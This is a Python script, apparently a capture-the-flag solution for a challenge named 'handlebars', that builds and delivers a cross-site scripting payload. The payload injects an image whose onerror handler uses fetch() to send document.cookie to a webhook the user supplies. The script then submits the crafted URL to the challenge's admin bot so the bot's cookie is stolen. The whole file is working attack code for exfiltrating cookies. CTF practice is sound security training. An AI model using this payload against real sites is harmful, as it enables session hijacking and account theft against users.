#!/usr/bin/env python3
import requests
from urllib.parse import quote
import argparse

parser = argparse.ArgumentParser(description="Send XSS payload to admin bot with custom webhook")
parser.add_argument('--webhook', required=True, help='Your webhook URL to receive the stolen cookie')
args = parser.parse_args()

webhook_url = args.webhook
payload = f'''
<script>document.body.innerHTML+='<img src="x" onerror="fetch(\\'{webhook_url}?c='+document.cookie+'\\')">'</script>
'''
encoded_input = quote(payload)
target_url = f"https://waynestateuniversity-ctf24-handlebars.chals.io/page/1337?input={encoded_input}"
encoded_target_url = quote(target_url)
adminbot_url = f"https://waynestateuniversity-ctf24-handlebars.chals.io/adminbot?url={encoded_target_url}"


print(f"Sending to: {adminbot_url}")
requests.get(adminbot_url)